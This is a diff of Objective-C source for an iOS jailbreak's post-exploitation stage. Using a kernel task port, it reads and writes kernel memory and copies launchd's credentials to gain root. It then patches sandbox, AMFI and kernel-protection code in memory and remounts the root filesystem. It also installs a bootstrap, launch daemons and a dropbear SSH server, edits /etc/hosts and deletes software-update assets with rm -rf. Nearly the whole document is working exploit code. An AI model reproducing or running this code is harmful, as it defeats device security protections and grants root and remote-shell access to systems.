@@ -6,44 +6,31 @@
 //  Copyright © 2017 kimjongcracks. All rights reserved.
 //
 
+#import "jailbreak.h"
 #import <Foundation/Foundation.h>
-#undef __IPHONE_OS_VERSION_MIN_REQUIRED
-#import <mach/mach.h>
-#import "devicesupport.h"
-
 #import <IOKit/IOKitLib.h>
 #import <dlfcn.h>
-#import <Foundation/Foundation.h>
-#import <UIKit/UIKit.h>
 #import <pthread.h>
-#import <mach/mach.h>
-
-#import "devicesupport.h"
-#import <sys/mount.h>
 #import <spawn.h>
 #import <copyfile.h>
-#import <mach-o/dyld.h>
+#import <sys/mount.h>
 #import <sys/types.h>
 #import <sys/stat.h>
 #import <sys/utsname.h>
-
+#import <mach/mach.h>
+#import <mach/arm/vm_types.h>
+#import <mach-o/dyld.h>
+#import "mac_policy.h"
 #import "patchfinder64.h"
+#import "csflags.h"
+#import "mach_vm.h"
 
-#define vm_address_t mach_vm_address_t
-
-mach_port_t tfp0=0;
-uint64_t slide=0;
-io_connect_t funcconn=0;
-// #define NSLog(...)
-kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
-kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
-kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
-kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
-
-uint32_t FuncAnywhere32(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2)
-{
-    return IOConnectTrap4(funcconn, 0, x1, x2, x0, addr);
-}
+uint64_t slide;
+mach_port_t tfp0;
+uint64_t kernbase;
+uint64_t allprocs_offset;
+uint64_t rootvnode_offset;
+bool cfg_enable_remote_ssh;
 
 void copyin(void* to, uint64_t from, size_t size) {
     mach_vm_size_t outsize = size;
@@ -63,7 +50,6 @@ void copyin(void* to, uint64_t from, size_t size) {
         if (size > 0x1000) {
             size = 0x1000;
         }
-        
     }
 }
 
@@ -95,21 +81,18 @@ uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
 
 #import "pte_stuff.h"
 
-void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
-{
-    io_iterator_t iterator;
-    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"), &iterator);
-    io_object_t servicex = IOIteratorNext(iterator);
-    funcconn = 0;
-    IOServiceOpen(servicex, mach_task_self(), 0, &funcconn);
-    assert(funcconn);
-    
-    tfp0 = pt;
-    
+void jailbreak(void) {
+    NSLog(@"jailbreaking using:");
+    NSLog(@"tfp0 = %x", tfp0);
+    NSLog(@"kernbase = %llx", kernbase);
+    NSLog(@"slide = %llx", slide);
+    NSLog(@"allprocs_offset = %llx", allprocs_offset);
+    NSLog(@"rootvnode_offset = %llx", rootvnode_offset);
+
     uint64_t bsd_task=0;
     uint64_t launchd_task = 0;
     {
-        uint64_t proc = ReadAnywhere64(allprocs+kernbase);
+        uint64_t proc = ReadAnywhere64(allprocs_offset+kernbase);
         NSLog(@"found procs at %llx", proc);
         while (proc) {
             uint32_t pid = ReadAnywhere32(proc+0x10);
@@ -147,42 +130,43 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     WriteAnywhere64(bsd_task+0x100, credpatch);
     
     checkvad();
-    
-    vm_address_t vmd = 0;
+
+    mach_vm_offset_t vmd = 0;
     _kernelrpc_mach_vm_allocate_trap(mach_task_self(), &vmd, 0x4000, VM_FLAGS_ANYWHERE);
     
     copyin((void*)vmd, kernbase, 0x4000);
     
-    struct mach_header_64* vmk = vmd;
+    struct mach_header_64* vmk = (struct mach_header_64*)vmd;
     uint64_t max = 0;
     uint64_t min = -1;
     
-    struct load_command* lc = vmk+1;
+    struct load_command* lc = (struct load_command*)(vmk + 1);
     for (int k=0; k < vmk->ncmds; k++) {
-        
         if (lc->cmd == LC_SEGMENT_64) {
-            struct segment_command_64* sg = lc;
+            struct segment_command_64* sg = (struct segment_command_64*)lc;
             NSLog(@"seg: %s", sg->segname);
             if (sg->vmaddr < min) {
                 min = sg->vmaddr;
             }
             if (sg->vmaddr + sg->vmsize > max) {
-                max = sg->vmaddr+sg->vmsize;
+                max = sg->vmaddr + sg->vmsize;
             }
         }
         
-        lc = ((char*)lc) + lc->cmdsize;
+        lc = (struct load_command*)(((char*)lc) + lc->cmdsize);
     }
+
+    size_t kernsize = (size_t)(max - min);
     
-    NSLog(@"%llx - %llx", min, max);
+    NSLog(@"%llx - %llx = %zx", min, max, kernsize);
     
-    char* kdump = malloc(max-min);
-    
-    for (int k=0; k < (max-min)/0x4000; k++) {
+    char* kdump = malloc(kernsize);
+
+    for (int k=0; k < kernsize/0x4000; k++) {
         copyin(kdump+k*0x4000, min+k*0x4000, 0x4000);
     }
     
-    NSLog(@"%llx", kdump);
+    NSLog(@"%zx", (uintptr_t)kdump);
     uint64_t kerndumpsize = 0;
     uint64_t gadget_base = 0;
     uint64_t gadget_size = 0;
@@ -215,12 +199,13 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
                 kerndumpbase = seg->vmaddr;
             }
             kerndumpsize += seg->vmsize;
-        } else if (load_cmd->cmd == LC_UNIXTHREAD) {
+        }
+        else if (load_cmd->cmd == LC_UNIXTHREAD) {
             struct {
-                unsigned long	cmd;		/* LC_THREAD or  LC_UNIXTHREAD */
-                unsigned long	cmdsize;	/* total size of this command */
+                unsigned long cmd;          /* LC_THREAD or LC_UNIXTHREAD */
+                unsigned long cmdsize;      /* total size of this command */
                 unsigned long flavor;       /* flavor of thread state */
-                unsigned long count;		   /* count of longs in thread state */
+                unsigned long count;        /* count of longs in thread state */
                 struct {
                     __uint64_t    __x[29];  /* General purpose registers x0-x28 */
                     __uint64_t    __fp;     /* Frame pointer x29 */
@@ -230,7 +215,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
                     __uint32_t    __cpsr;   /* Current program status register */
                     __uint32_t    __pad;    /* Same size for 32-bit or 64-bit clients */
                 } state;
-            } * thr = load_cmd;
+            } * thr = (void*)load_cmd;
             entryp = thr->state.__pc;
         }
         
@@ -248,9 +233,15 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     entryp += slide;
     uint64_t rvbar = entryp & (~0xFFF);
     
-    uint64_t cpul = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), rvbar-gadget_base+0x40, text_exec_base, 1);
+    uint64_t cpul = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec),
+                                        rvbar - gadget_base + 0x40,
+                                        text_exec_base,
+                                        1);
     
-    uint64_t optr = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), rvbar-gadget_base+0x50, text_exec_base, 20);
+    uint64_t optr = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec),
+                                        rvbar - gadget_base + 0x50,
+                                        text_exec_base,
+                                        20);
     if (uref) {
         optr = ReadAnywhere64(optr) - gPhysBase + gVirtBase;
     }
@@ -262,10 +253,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     uint64_t pmap_store = find_kernel_pmap();
     NSLog(@"pmap: %llx", pmap_store);
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
-    
-    
-    
-    
+
     uint64_t shellcode = physalloc(0x4000);
     
     /*
@@ -456,7 +444,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
      */
     
     int cpacr_idx = 0;
-    uint32_t* opps = gadget_base - min + kdump;
+    uint32_t* opps = (uint32_t*)(gadget_base - min + kdump);
     
     while (1) {
         if (opps[cpacr_idx] == 0xd5181040) {
@@ -552,8 +540,8 @@ remappage[remapcnt++] = (x & (~PMK));\
     {
         uint64_t endf = prelink_base+prelink_size;
         uint64_t ends = whole_size - (endf - whole_base);
-        uint32_t* opps_stream = whole_dump + endf - whole_base;
-        uint64_t* ptr_stream = whole_dump + endf - whole_base;
+        uint32_t* opps_stream = (uint32_t*)(whole_dump + endf - whole_base);
+        uint64_t* ptr_stream = (uint64_t*)(whole_dump + endf - whole_base);
 
         uint64_t lastk = 0;
         int streak = 0;
@@ -579,15 +567,12 @@ remappage[remapcnt++] = (x & (~PMK));\
             }
         }
         
-        
         if (streak == 9) {
-
-            
-            char* sbstr = whole_dump + lastk + endf - whole_base - 8;
+            uint8_t* sbstr = whole_dump + lastk + endf - whole_base - 8;
             
             uint64_t extract_attr_recipe = *(uint64_t*)(sbstr + 72 * 0x20 + 8 /*fptr*/);
             
-            uint32_t* opcode_stream = extract_attr_recipe - whole_base + whole_dump;
+            uint32_t* opcode_stream = (uint32_t*)(extract_attr_recipe - whole_base + whole_dump);
             
             int l = 0;
             while (1) {
@@ -627,7 +612,7 @@ remappage[remapcnt++] = (x & (~PMK));\
             
             uint64_t tfp = *(uint64_t*)(sbstr + 45 * 0x20 + 8 /*fptr*/);
             
-            opcode_stream = tfp - whole_base + whole_dump;
+            opcode_stream = (uint32_t*)(tfp - whole_base + whole_dump);
             
             int cbz = 0;
             while (1) {
@@ -640,13 +625,14 @@ remappage[remapcnt++] = (x & (~PMK));\
             RemapPage(tfp + cbz*4);
             WriteAnywhere32(NewPointer(tfp+cbz*4), 0xd503201f);
         }
-        
     }
-    /*
-     nonceenabler
-     */
-    
+
+
     {
+        /*
+         nonceenabler
+         */
+
         uint64_t endf = prelink_base+prelink_size;
         uint64_t ends = whole_size - (endf - whole_base);
         char* sbstr = memmem(whole_dump + endf - whole_base, ends, "com.apple.System.boot-nonce", strlen("com.apple.System.boot-nonce"));
@@ -662,7 +648,6 @@ remappage[remapcnt++] = (x & (~PMK));\
             }
         }
     }
-    
     
     
     uint64_t memcmp_got = find_amfi_memcmpstub();
@@ -697,7 +682,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
         
         uint64_t nopag = sbops_end - sbops;
-        
+
         for (int i = 0; i < nopag; i+= PSZ) {
             RemapPage(((sbops + i) & (~PMK)));
         }
@@ -748,7 +733,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
         
         uint64_t nopag = (sbops_end - sbops)/(PSZ);
-        
+
         for (int i = 0; i < nopag; i++) {
             RemapPage(((sbops + i*(PSZ)) & (~PMK)));
         }
@@ -812,7 +797,6 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     {
         // mount patch
-        extern uint64_t rootvnode_offset;
         uint64_t rootfs_vnode = ReadAnywhere64(rootvnode_offset + kernbase);
         
         struct utsname uts;
@@ -839,97 +823,116 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
     
     {
-        char path[256];
-        uint32_t size = sizeof(path);
-        _NSGetExecutablePath(path, &size);
-        char* pt = realpath(path, 0);
-        
+        /*
+         persistent filesystem modifications
+         */
+
+        NSBundle *resBundle = [NSBundle mainBundle];
+        pid_t tmp_pid;
+        const char** tmp_args;
+
+        int installedFd = open("/.installed_yaluX", O_RDONLY);
+
+        // extract root file system patches
+        if (installedFd == -1) {
+            NSString* tarPath = [resBundle pathForResource:@"tar" ofType:nil];
+            unlink("/bin/tar");
+            copyfile([tarPath UTF8String], "/bin/tar", 0, COPYFILE_ALL);
+            chmod("/bin/tar", 0755);
+            chown("/bin/tar", 0, 0);
+
+            NSString* bootstrapTarPath = [resBundle pathForResource:@"bootstrap.tar" ofType:nil];
+            tmp_args = (const char*[]){
+                "/bin/tar",
+                "--preserve-permissions",
+                "--no-overwrite-dir",
+                "-C", "/",
+                "-xvf",
+                [bootstrapTarPath UTF8String],
+                NULL
+            };
+            posix_spawn(&tmp_pid, "/bin/tar", NULL, NULL, (char**)tmp_args, NULL);
+            waitpid(tmp_pid, 0, 0);
+            
+            NSString* launchctlPath = [resBundle pathForResource:@"launchctl" ofType:nil];
+            unlink("/bin/launchctl");
+            copyfile([launchctlPath UTF8String], "/bin/launchctl", 0, COPYFILE_ALL);
+            chmod("/bin/launchctl", 0755);
+            chown("/bin/launchctl", 0, 0);
+            
+            close(open("/.installed_yaluX", O_RDWR|O_CREAT));
+            close(open("/.cydia_no_stash", O_RDWR|O_CREAT));
+
+            int hostsFd = open("/etc/hosts", O_RDWR|O_APPEND);
+            if (hostsFd != -1) {
+                const char *s;
+                s = "127.0.0.1 iphonesubmissions.apple.com\n"
+                    "127.0.0.1 radarsubmissions.apple.com\n";
+                write(hostsFd, s, strlen(s));
+                close(hostsFd);
+            }
+
+            system("/usr/bin/uicache");
+            
+            system("killall -SIGSTOP cfprefsd");
+            NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
+            [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
+            [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
+            system("killall -9 cfprefsd");
+
+            rename("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist",
+                   "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist.bak");
+        }
+        else {
+            close(installedFd);
+        }
+
+
+        // install usermode reload script
         {
-            __block pid_t pd = 0;
-            NSString* execpath = [[NSString stringWithUTF8String:pt]  stringByDeletingLastPathComponent];
-            
-            
-            int f = open("/.installed_yaluX", O_RDONLY);
-            
-            if (f == -1) {
-                NSString* tar = [execpath stringByAppendingPathComponent:@"tar"];
-                NSString* bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
-                const char* jl = [tar UTF8String];
-                
-                unlink("/bin/tar");
-                unlink("/bin/launchctl");
-                
-                copyfile(jl, "/bin/tar", 0, COPYFILE_ALL);
-                chmod("/bin/tar", 0777);
-                jl="/bin/tar"; //
-                
-                chdir("/");
-                
-                posix_spawn(&pd, jl, 0, 0, (char**)&(const char*[]){jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL}, NULL);
-                NSLog(@"pid = %x", pd);
-                waitpid(pd, 0, 0);
-                
-                
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
-                jl = [jlaunchctl UTF8String];
-                
-                copyfile(jl, "/bin/launchctl", 0, COPYFILE_ALL);
-                chmod("/bin/launchctl", 0755);
-                
-                open("/.installed_yaluX", O_RDWR|O_CREAT);
-                open("/.cydia_no_stash",O_RDWR|O_CREAT);
-                
-                
-                system("echo '127.0.0.1 iphonesubmissions.apple.com' >> /etc/hosts");
-                system("echo '127.0.0.1 radarsubmissions.apple.com' >> /etc/hosts");
-                
-                system("/usr/bin/uicache");
-                
-                system("killall -SIGSTOP cfprefsd");
-                NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
-                
-                [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
-                
-                [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
-                system("killall -9 cfprefsd");
-                
+            NSString* reloadPath = [resBundle pathForResource:@"reload" ofType:nil];
+            unlink("/usr/libexec/reload");
+            copyfile([reloadPath UTF8String], "/usr/libexec/reload", 0, COPYFILE_ALL);
+            chmod("/usr/libexec/reload", 0755);
+            chown("/usr/libexec/reload", 0, 0);
+
+            NSString* reloadPlistPath = [resBundle pathForResource:@"0.reload.plist" ofType:nil];
+            unlink("/Library/LaunchDaemons/0.reload.plist");
+            copyfile([reloadPlistPath UTF8String], "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
+            chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
+            chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
+        }
+
+        // install SSH agent
+        {
+            NSString* dropbearPlistPath = [resBundle pathForResource:@"dropbear.plist" ofType:nil];
+            unlink("/Library/LaunchDaemons/dropbear.plist");
+            copyfile([dropbearPlistPath UTF8String], "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
+            chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
+            chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
+            if (cfg_enable_remote_ssh) {
+                NSLog(@"enabling SSH remote access");
+                NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/Library/LaunchDaemons/dropbear.plist"];
+                NSMutableArray *a = [NSMutableArray arrayWithArray:[md valueForKey:@"ProgramArguments"]];
+                a[4] = @"22";
+                [md setValue:a forKey:@"ProgramArguments"];
+                [md writeToFile:@"/Library/LaunchDaemons/dropbear.plist" atomically:YES];
             }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
-                char* jl = [jlaunchctl UTF8String];
-                unlink("/usr/libexec/reload");
-                copyfile(jl, "/usr/libexec/reload", 0, COPYFILE_ALL);
-                chmod("/usr/libexec/reload", 0755);
-                chown("/usr/libexec/reload", 0, 0);
-                
-            }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
-                char* jl = [jlaunchctl UTF8String];
-                unlink("/Library/LaunchDaemons/0.reload.plist");
-                copyfile(jl, "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
-                chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
-                chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
-            }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
-                char* jl = [jlaunchctl UTF8String];
-                unlink("/Library/LaunchDaemons/dropbear.plist");
-                copyfile(jl, "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
-                chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
-                chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
-            }
-            unlink("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
-            
         }
     }
+
+    /*
     chmod("/private", 0777);
     chmod("/private/var", 0777);
     chmod("/private/var/mobile", 0777);
     chmod("/private/var/mobile/Library", 0777);
     chmod("/private/var/mobile/Library/Preferences", 0777);
+    */
+
     system("rm -rf /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; touch /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chmod 000 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chown 0:0 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
+
     system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
+
     WriteAnywhere64(bsd_task+0x100, orig_cred);
     sleep(2);
     
